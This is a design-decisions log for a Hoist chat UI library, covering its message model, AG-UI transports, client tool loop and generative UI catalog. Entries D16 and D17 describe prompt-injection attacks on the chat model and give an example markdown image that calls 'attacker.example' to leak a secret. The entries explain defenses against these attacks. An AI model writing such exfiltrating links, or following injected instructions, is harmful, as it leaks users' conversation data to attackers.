# Design Decisions

This log records the significant design choices in Hoist Chat Kit and the reasons for them. Each
entry states the decision, the context, and the alternatives we rejected. Add new entries at the
end. When a later decision replaces an earlier one, mark the old entry as superseded and link to
the new one.

## D1. A standalone package that follows Hoist's own conventions

**Decision.** The kit is its own npm package, `@xh/hoist-chat-kit`, with `@xh/hoist` as a peer
dependency. It ships TypeScript and SCSS source, as hoist-react does. Its code follows the Hoist
conventions in full: `HoistModel` for state, `hoistCmp` components with element factories, TC39
decorators, and `xh-` BEM class names.

**Why.** Chat UIs change faster than the rest of Hoist, so the kit needs its own release cycle.
Apps compile it with their own build, together with Hoist, so the kit adds no build step of its
own.

## D2. The kit owns its message model, and protocols plug in as adapters

**Decision.** A message is an immutable `ChatMessage` that holds an ordered list of typed parts:
text, reasoning, tool call, file, source and data. Components render this model only. No
component sees a provider's or a protocol's wire format.

**Why.** The agent-to-UI protocols are young and still move. AG-UI reached 1.0 in October 2026,
and A2UI is a release candidate. Our own model keeps that churn out of app code. The part types
and the tool call states follow the Vercel AI SDK `UIMessage` vocabulary, which most chat
libraries share. That keeps each adapter small.

**Alternatives.** Use AG-UI messages or AI SDK messages as the model. Both would tie apps to one
protocol and to its release cycle.

## D3. Messages are immutable records, replaced on change

**Decision.** `ChatModel.messages` is an `@observableRef` array of immutable `ChatMessage`
objects. Each streamed change makes a new message and new objects for the changed parts only.

**Why.** This follows the Hoist `StoreRecord` precedent. Memoized components then re-render only
the message and the part that changed. Plain records also serialize for storage with no extra
code.

**Alternatives.** Observable message objects that mutate in place. That is more MobX-native, but
it needs class instances for every part and custom serialization.

## D4. AG-UI 1.0 events are the wire vocabulary

**Decision.** Transports yield `ChatEvent`s. These are the AG-UI 1.0 events, with the same type
strings and field names. The kit mirrors the types and does not depend on `@ag-ui/*` at runtime.
Kit-specific content travels as AG-UI `CUSTOM` events with the `xh.chat.` name prefix.

**Why.** AG-UI is MIT-licensed, and agent frameworks such as LangGraph, Mastra, Pydantic AI and
Google ADK emit it. Its events map almost one to one onto our parts. Any AG-UI server therefore
works with the kit and needs no adapter. A Hoist server can emit the same events as NDJSON, so we
do not invent a protocol of our own.

**Alternatives.** A kit-native event format. That adds one more protocol for server authors to
learn and gives no interop. A runtime dependency on `@ag-ui/core` pulls in `zod` as a peer for
types we can mirror in one file.

## D5. Codecs translate wire formats, transports carry them

**Decision.** A `ChatTransport` gets events from a backend. A `ChatCodec` encodes the request
body and decodes the records that come back. `HoistChatTransport` reads NDJSON with
`XH.fetchNdjson`. `SseChatTransport` reads Server-Sent Events (SSE). `AgUiCodec` speaks AG-UI.
`AnthropicCodec` speaks the Anthropic Messages API.

**Why.** Framing (NDJSON or SSE) and format (AG-UI or Anthropic) change independently. With
`AnthropicCodec`, a Hoist server can relay Anthropic's stream line by line and translate nothing.
The translation then lives once, in tested TypeScript, rather than in each app's server.

## D6. NDJSON through `XH.fetchNdjson` is the default transport

**Decision.** `HoistChatTransport` posts to a hoist-core endpoint and reads the reply with
`XH.fetchNdjson`. D14 covers how it cancels a stream.

**Why.** It reuses Hoist's auth, correlation IDs, tracing, activity tracking and error decoding.
Hoist apps already have a hoist-core server, and `renderNDJSON` already pairs with
`fetchNdjson`.

**Gap.** `BaseController.renderNDJSON` flushes after the first row, then every 32 KB. Token
streaming needs a flush after each line, so the Toolbox controller writes the stream itself. A
streaming option for hoist-core, with a flush per line and disconnect detection, would remove
that code from every app.

## D7. The client runs the tool loop

**Decision.** `ChatModel` runs the agent loop for client tools. When a model call ends with tool
calls that have a client `execute`, the model runs them, sends the results back, and starts the
next call, up to `maxSteps`. Tools the backend runs arrive with their results in the stream, and
the model only displays them.

**Why.** Many chat tools act on the app itself: they change a dashboard or open a view. Only the
browser can run those. The Toolbox weather agent works this way. A server-side agent loop still
works, because the backend then sends both the calls and the results.

## D8. Generative UI goes through data parts and a renderer registry

**Decision.** AG-UI `ACTIVITY_SNAPSHOT` events and `xh.chat.data` events become `data` parts. An
app renders them through `ChatModelConfig.dataRenderers`, keyed by `dataType`. A data part with no
renderer shows as JSON. The kit ships no A2UI, OpenUI or MCP Apps renderer in v1.

**Why.** A2UI v1.0 is a release candidate with no official React renderer. OpenUI is
vendor-driven. A correct MCP Apps host needs a sandbox origin and a postMessage bridge, which
need security review. The seam lets each of these plug in later with no change to the core.

**Note.** "Open UI" in the brief is taken to mean Thesys OpenUI, the generative UI framework.
The W3C Open UI group standardizes HTML controls and does not relate to agents.

## D9. Desktop components first, platform-neutral models

**Decision.** v1 ships desktop components only, in `desktop/cmp/chat`. `core/`, `transport/` and
`cmp/` do not import from `@xh/hoist/desktop`.

**Why.** The first consumers are desktop dashboards. A mobile package can follow with no change
to the models.

## D10. CSS class and variable names use the `xh-chat` prefix

**Decision.** Class names are `xh-chat-*` in BEM form. Theme variables are `--xh-chat-*`, with
defaults built from Hoist variables.

**Why.** The `xh-` prefix marks XH library code. The kit is an XH library, and the `chat`
segment keeps it clear of names that hoist-react may add.

## D11. CodeQL runs only when the repo is public

**Decision.** The CodeQL job checks the repo visibility and skips its analysis while the repo is
private.

**Why.** Code scanning on a private repo needs GitHub Code Security, which this repo does not
have. The check turns the scan on by itself when the repo goes public.

## D12. The build check packs the package

**Decision.** `pnpm build` packs the package and checks the contents. Every source package must
ship, and specs and planning files must not.

**Why.** The kit ships source, so there is no compile output to build. A missing `files` entry
is the failure a source package is most likely to ship by mistake.

## D13. Finish reasons use the Vercel AI SDK vocabulary

**Decision.** A codec maps the provider's stop reason to one of `stop`, `length`, `tool-calls`,
`content-filter` or `other`, and records it as `metadata.finishReason` on the assistant message.
The raw provider value goes in `metadata.stopReason`.
`ChatModel` adds one value of its own, `max-steps`, for a turn that hit its `maxSteps` limit.

**Why.** Apps that show "the reply was cut off" or "the model declined" need one set of values
across providers. The AI SDK set is the one most chat code already knows.

## D14. Streams abort through `fetchOpts.signal`, not `autoAbortKey`

**Decision.** `HoistChatTransport` and `SseChatTransport` pass their own `AbortSignal` to the
native fetch through `fetchOpts.signal`. They combine it with the turn's signal through
`AbortSignal.any`.

**Why.** Hoist releases an `autoAbortKey` as soon as the response headers arrive. After that,
`XH.fetchService.abort(key)` returns false and the body keeps streaming, so the server keeps
generating tokens. A signal on the native fetch cancels the body too.

**Cost.** `AbortSignal.any` needs a 2024-or-later browser. A `signal` option on Hoist's
`FetchOptions`, with abort support for streamed responses, would let the transports drop the
workaround.

## D15. Generative UI is a Hoist component catalog, with protocols as translators

**Decision.** The next deliverable after the chat UI is a generative UI registry. An app
registers Hoist components, such as a grid, a chart or a card, each with a typed props schema.
The kit generates the model's instructions and tools from the catalog, checks each spec the
model writes against it, and renders the result inline in the chat. Protocols such as OpenUI
Lang and A2UI translate into the same catalog specs through an adapter. v1 ships the seam
(`data` parts and `dataRenderers`) and points in this direction. The full registry follows.

**Why.** A client chose OpenUI because Hoist had no answer for chat and generative UI. The chat
UI answers the first half. The second half needs generative UI built on Hoist's own grids and
charts, which are stronger than generic component kits for data-dense apps. A catalog the app
controls keeps the model to known components and known props. XH has a proof of concept that
renders Hoist grids and charts inline in a chat in this way, under tight constraints.

**Update.** The catalog shipped in v1, as designed here: `ChatUiCatalog` in `genui/`, with the
built-in grid, chart, metrics and card in `desktop/cmp/genui/`. Each component is an inline
client tool, so streaming, validation and errors reuse the tool machinery. `ChatUiAdapter` is
the seam for A2UI and OpenUI. The kit ships the interface, and no adapter.

## D16. Markdown images do not load by default

**Decision.** `ChatMarkdown` does not load markdown images unless `allowImages` permits them.
A blocked image renders as a link, labeled with its alt text, that the user can choose to open.
An app allows images with `true`, or with a function that decides by source URL. `ChatPanel`
and `ChatMessageList` pass the setting through.

**Why.** An image sends a request to its URL the moment it renders, with no action by the user.
A prompt injection in a web page, a document or a tool result can tell the model to write an
image whose URL holds data from the conversation, such as
`![](https://attacker.example/?d=<secret>)`. The request then sends that data to the attacker's
server. Published attacks on LLM chat products have used this channel. A link needs a click,
so the user sees the URL first.

**Cost.** A model that draws charts or diagrams as markdown images shows links until the app
allows its image host. Apps that show trusted images should allow their own URLs with a
function, not all images with `true`.

**Alternatives.** Strip images entirely, with `disallowedElements`. That hides the alt text,
and the user cannot tell that the reply had an image.

## D17. A card action shows exactly what it sends

**Decision.** The built-in card's follow-up actions send their `prompt` as the user's own
message. The button's tooltip shows the prompt before the click, and the chat shows it as the
user's message after it. A prompt is at most 200 characters.

**Why.** The model writes both the button text and the prompt. The threat is the one in D16: a
prompt injection in a web page, a document or a tool result can steer what the model writes. It
could label a button "Show trades" and make its prompt an instruction the user never meant to give.
One example tells an agent to send data somewhere. A click then sends that instruction with the
user's authority. If the user sees the whole prompt before and after the click, the button cannot
claim one thing and send another unseen. The length cap keeps the whole prompt readable in a
tooltip, and leaves no room to hide a long instruction behind a short one.

**Cost.** A model cannot attach hidden context to an action. It writes the prompt as the user
would say it, and keeps any detail it needs in the conversation.

**Alternatives.** Put the prompt in the composer for the user to send. That adds a step to every
action, and the user still has to read the prompt. Show only the tooltip. A user who does not
hover would not see the prompt before it goes.

## D18. Generative UI names carry the `ChatUi` prefix

**Decision.** Every public generative UI name starts with `ChatUi` or `chatUi`. Types are
`ChatUiCatalog`, `ChatUiComponentSpec`, `ChatUiGridSpecProps` and `ChatUiGridSpecOptions`.
Components are `ChatUiGrid` and its factory `chatUiGrid`. The functions that return catalog
specs are `chatUiGridSpec()`, `chatUiChartSpec()`, `chatUiMetricsSpec()` and `chatUiCardSpec()`.

**Why.** D10 gives kit names a prefix, so that they never collide with app or Hoist names. A
bare `gridComponent()` or `GridComponentProps` would sit beside an app's own grid code. The
`Spec` suffix says what the function returns, a `ChatUiComponentSpec`, and pairs it with the
component it renders.

**Alternatives.** `chatGridComponent()` and the like. It reads well alone, but adds a third
naming scheme beside `ChatUiGrid` and `ChatUiComponentSpec`, and hides that the result is a spec.
